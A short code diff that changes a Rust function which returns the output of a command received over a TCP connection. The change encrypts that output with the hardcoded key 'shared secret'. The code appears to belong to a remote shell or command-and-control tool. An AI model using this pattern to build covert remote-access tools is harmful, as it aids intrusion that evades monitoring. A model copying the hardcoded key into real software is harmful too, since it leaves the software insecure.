@@ -187,9 +187,10 @@ pub fn handle_cmd(stream: &mut TcpStream, command: &str, os: String) {
 
     let stdout = String::from_utf8_lossy(&output.stdout);
     let stderr = String::from_utf8_lossy(&output.stderr);
-    stream.write(stdout.as_bytes()).expect( "Error writing to stream");
-    stream.write(stderr.as_bytes()).expect( "Error writing to stream");
-    stream.write(b"||cmd||").expect( "Error writing to stream");
+    let combined_output = format!("{}\r\n{}\r\n||cmd||\r\n", stdout, stderr);
+
+    let encrypted_data = encrypt(combined_output.as_bytes(), b"shared secret").expect("Failed to encrypt");
+    stream.write(&encrypted_data).expect( "Error writing to stream");
     stream.flush().expect("Error flushing stream");
 }
 
